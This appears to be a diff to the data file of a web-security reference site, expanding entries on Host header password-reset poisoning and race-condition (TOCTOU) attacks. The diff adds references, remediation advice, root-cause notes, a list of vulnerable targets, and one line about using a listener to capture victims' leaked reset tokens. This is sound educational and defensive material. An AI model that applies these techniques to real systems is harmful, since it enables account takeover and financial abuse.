+            ["A listener on your domain", "Capture leaked reset tokens when the victim clicks"]
+          ]},
           { "title": "References", "type": "references", "items": [
-            { "label": "PortSwigger — HTTP Host header attacks", "url": "https://portswigger.net/web-security/host-header" },
-            { "label": "PortSwigger — Password reset poisoning", "url": "https://portswigger.net/web-security/host-header/exploiting/password-reset-poisoning" }
+            { "label": "PortSwigger — HTTP Host header attacks (with labs)", "url": "https://portswigger.net/web-security/host-header" },
+            { "label": "PortSwigger — Password reset poisoning", "url": "https://portswigger.net/web-security/host-header/exploiting/password-reset-poisoning" },
+            { "label": "OWASP WSTG — Testing for Host Header Injection", "url": "https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/07-Input_Validation_Testing/17-Testing_for_Host_Header_Injection" }
           ]},
           { "title": "Remediation", "type": "notes", "items": [
-            "Never build absolute URLs (especially reset/verification links) from the Host or X-Forwarded-Host header — use a server-side configured canonical domain.",
-            "Validate the incoming Host against an allow-list of expected domains and reject anything else.",
-            "Strip or ignore X-Forwarded-Host and similar override headers unless they come from a trusted, authenticated proxy.",
-            "Reject requests with duplicate or malformed Host headers.",
-            "Scope reset tokens tightly (short expiry, single use, bound to the account) to limit the damage if a link leaks."
+            "Never build absolute URLs — especially password-reset and verification links — from the Host or X-Forwarded-Host header; use a server-side configured canonical base URL.",
+            "Validate the incoming Host against a strict allow-list of expected domains and return an error for anything else.",
+            "Strip or ignore X-Forwarded-Host and other override headers unless they arrive from a trusted, authenticated proxy you control.",
+            "Reject requests with duplicate, malformed, or ambiguous Host headers, and ensure the proxy and app agree on the effective host.",
+            "Do not key caches on, or make access decisions from, the raw Host header.",
+            "Scope reset tokens tightly (short expiry, single use, bound to the account) so a leaked link causes minimal damage."
           ]}
         ]
       },
@@ -3174,6 +3299,28 @@ var VULNS = [
           { label: "Signal", cmd: "The action succeeds more times than the limit should allow" }
         ],
         sections: [
+          {
+            title: "Root Cause & Concepts",
+            type: "notes",
+            items: [
+              "TOCTOU: the app checks a condition (balance sufficient, coupon unused, username free) and then acts on it in a separate, non-atomic step; two requests that both pass the check before either commits both succeed.",
+              "The exploitable window is the gap between check and commit — often only milliseconds, but real, and widened by slow DB writes, network calls, or external checks.",
+              "Concurrency exposes it: many requests arriving within that window make limit-once logic apply many times.",
+              "The single-packet attack (HTTP/2) removes network jitter by delivering ~20-30 requests in one TCP packet so they hit the server nearly simultaneously, exposing microsecond windows.",
+              "The robust fix is atomicity/serialisation at the data layer (transactions, locks, constraints), not more application-level checks."
+            ]
+          },
+          {
+            title: "Where to Look",
+            type: "notes",
+            items: [
+              "Anything single-use or capped and tied to value: gift-card/coupon redemption, referral bonuses, one-per-account promotions, loyalty points.",
+              "Balance- or quota-checked operations: withdrawals, transfers, purchases against a balance, rate-limited actions, stock/inventory decrement.",
+              "Uniqueness registration: usernames, emails, or slugs created in parallel before a unique constraint applies.",
+              "State transitions: approve/cancel/refund/confirm fired concurrently to reach an inconsistent state (e.g. refund + keep goods).",
+              "Multi-step flows where a limit is checked early but the effect is committed later."
+            ]
+          },
           {
             title: "How It's Exploited",
             type: "commands",
